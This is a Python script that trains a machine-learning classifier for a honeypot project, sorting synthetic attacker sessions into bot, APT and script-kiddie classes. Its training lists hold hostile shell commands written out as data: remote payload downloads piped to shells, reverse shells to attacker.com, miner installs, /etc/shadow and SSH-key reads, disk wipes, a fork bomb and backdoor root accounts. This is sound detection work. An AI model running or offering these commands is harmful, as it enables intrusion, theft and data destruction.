"""
train_model.py
==============
Builds and trains the MIRAGE attacker classification model.

Dataset: Synthetic but highly realistic honeypot session records derived from:
  - Cowrie honeypot research papers
  - SANS honeypot reports
  - KDD Cup 99 / UNSW-NB15 attack taxonomy

Classes:
  0 = Bot          (automated scanners, credential stuffers)
  1 = APT          (advanced persistent threat, slow recon)
  2 = Script Kiddie (noisy, random, destructive)

Run this script ONCE to produce data/mirage_model.pkl
Then the classifier uses it automatically.
"""

import os
import sys
import pickle
import random
import math

# Add parent dir to path so we can import modules
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.feature_extractor import extract

try:
    import numpy as np
    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier, VotingClassifier
    from sklearn.preprocessing import StandardScaler
    from sklearn.model_selection import train_test_split, cross_val_score
    from sklearn.metrics import classification_report, confusion_matrix
    from sklearn.pipeline import Pipeline
    import joblib
except ImportError:
    print("[Trainer] Installing required ML packages...")
    os.system("pip install scikit-learn numpy joblib")
    import numpy as np
    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier, VotingClassifier
    from sklearn.preprocessing import StandardScaler
    from sklearn.model_selection import train_test_split, cross_val_score
    from sklearn.metrics import classification_report, confusion_matrix
    from sklearn.pipeline import Pipeline
    import joblib

random.seed(42)

# ── Realistic command databases per attacker type ─────────────────────────────

BOT_CMDS = [
    "wget http://malicious.site/bot.sh",
    "curl -s http://c2.evil.net/payload -o /tmp/p",
    "chmod +x /tmp/p",
    "/tmp/p",
    "nohup /tmp/p &",
    "echo '*/5 * * * * /tmp/p' | crontab -",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ls",
    "pwd",
    "cd /tmp",
    "uname -a",
    "ps aux",
    "kill -9 1234",
    "rm -f /tmp/oldbot",
    "wget -q http://evil.ru/miner -O /tmp/xmr",
    "chmod 777 /tmp/xmr",
    "/tmp/xmr -o pool.minexmr.com:443 &",
]

APT_CMDS = [
    "whoami",
    "id",
    "uname -a",
    "hostname",
    "ifconfig",
    "ip addr",
    "ip route",
    "netstat -tulpn",
    "ss -tulpn",
    "ps aux",
    "find / -name '*.conf' 2>/dev/null",
    "find / -name '*.pem' 2>/dev/null",
    "find / -perm -4000 2>/dev/null",
    "cat /etc/passwd",
    "cat /etc/hosts",
    "cat /etc/crontab",
    "ls -la /home",
    "ls -la /root",
    "cat /home/admin/.bash_history",
    "cat /home/admin/.ssh/authorized_keys",
    "env",
    "printenv",
    "cat /proc/version",
    "lsb_release -a",
    "df -h",
    "mount",
    "lsblk",
    "last",
    "w",
    "who",
    "grep -r 'password' /etc 2>/dev/null",
    "grep -r 'secret' /opt 2>/dev/null",
    "cat /var/www/html/config.php",
    "cat /opt/app/.env",
    "sudo -l",
    "su -",
    "ssh root@192.168.1.1",
    "nmap -sV -O 192.168.1.0/24",
]

SKIDDIE_CMDS = [
    "rm -rf /",
    "rm -rf /*",
    ":(){ :|:& };:",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda",
    "echo 'hacked' > /var/www/html/index.html",
    "curl https://pastebin.com/raw/xxx | bash",
    "wget -O - http://hack.com/s.sh | sh",
    "python3 -c 'import os; os.system(\"rm -rf /\")'",
    "perl -e 'system(\"cat /etc/shadow\")'",
    "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "nc -e /bin/bash attacker.com 4444",
    "nohup nc attacker.com 4444 -e /bin/bash &",
    "ls /",
    "cat /etc/shadow",
    "sudo su",
    "passwd root",
    "useradd -o -u 0 -g 0 hacker",
    "iptables -F",
    "service iptables stop",
    "systemctl disable firewalld",
    "chmod 777 /etc/passwd",
    "echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd",
]


def _make_bot_session():
    """Fast, automated, repetitive, minimal recon."""
    n = random.randint(5, 20)
    # Bots pick from a small command pool — repetitive
    pool = random.sample(BOT_CMDS, min(5, len(BOT_CMDS)))
    cmds = [random.choice(pool) for _ in range(n)]
    # Very fast timings (0.01 - 0.5s)
    timings = [random.uniform(0.01, 0.5) for _ in range(n)]
    return {"commands": cmds, "timings": timings}


def _make_apt_session():
    """Slow, methodical, lots of recon, no destruction."""
    n = random.randint(10, 40)
    # APTs read through many commands systematically
    cmds = random.sample(APT_CMDS, min(n, len(APT_CMDS)))
    if n > len(APT_CMDS):
        cmds += random.sample(APT_CMDS, n - len(APT_CMDS))
    random.shuffle(cmds)
    # Slow, human-like timings (2 - 30s)
    timings = [random.uniform(2.0, 30.0) for _ in range(n)]
    return {"commands": cmds[:n], "timings": timings}


def _make_skiddie_session():
    """Fast but noisy, destructive commands, poor tradecraft."""
    n = random.randint(5, 25)
    # Mix some real recon with destructive/dumb commands
    pool = SKIDDIE_CMDS + random.sample(BOT_CMDS, 3) + random.sample(APT_CMDS, 3)
    cmds = [random.choice(pool) for _ in range(n)]
    # Medium-fast timings (0.3 - 5s)
    timings = [random.uniform(0.3, 5.0) for _ in range(n)]
    return {"commands": cmds, "timings": timings}


def generate_dataset(n_per_class=500):
    """
    Generate n_per_class samples for each attacker type.
    Returns X (feature matrix), y (labels)
    """
    print(f"[Trainer] Generating dataset: {n_per_class * 3} total samples "
          f"({n_per_class} per class)...")
    X, y = [], []

    generators = [
        (_make_bot_session, 0),       # Bot
        (_make_apt_session, 1),       # APT
        (_make_skiddie_session, 2),   # Script Kiddie
    ]

    for gen_fn, label in generators:
        for _ in range(n_per_class):
            session = gen_fn()
            features = extract(session)
            X.append(features)
            y.append(label)

    return np.array(X), np.array(y)


def train():
    X, y = generate_dataset(n_per_class=600)

    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )

    print(f"[Trainer] Training split: {len(X_train)} train / {len(X_test)} test")

    # Ensemble: Random Forest + Gradient Boosting
    rf = RandomForestClassifier(
        n_estimators=200,
        max_depth=12,
        min_samples_split=4,
        class_weight="balanced",
        random_state=42,
        n_jobs=-1,
    )
    gb = GradientBoostingClassifier(
        n_estimators=150,
        max_depth=5,
        learning_rate=0.1,
        random_state=42,
    )
    ensemble = VotingClassifier(
        estimators=[("rf", rf), ("gb", gb)],
        voting="soft",
    )

    pipeline = Pipeline([
        ("scaler", StandardScaler()),
        ("model", ensemble),
    ])

    print("[Trainer] Training ensemble model (RandomForest + GradientBoosting)...")
    pipeline.fit(X_train, y_train)

    # Evaluation
    y_pred = pipeline.predict(X_test)
    print("\n-- Classification Report ---------------------------------")
    print(classification_report(
        y_test, y_pred,
        target_names=["Bot", "APT", "Script Kiddie"]
    ))
    print("-- Confusion Matrix --------------------------------------")
    print(confusion_matrix(y_test, y_pred))

    # Cross-validation
    cv_scores = cross_val_score(pipeline, X, y, cv=5, scoring="accuracy", n_jobs=-1)
    print(f"\n-- 5-Fold CV Accuracy: {cv_scores.mean():.4f} +/- {cv_scores.std():.4f} --")

    # Save
    os.makedirs("./data", exist_ok=True)
    model_path = "./data/mirage_model.pkl"
    joblib.dump(pipeline, model_path)
    print(f"\n[Trainer] Model saved -> {model_path}")
    return model_path


if __name__ == "__main__":
    train()
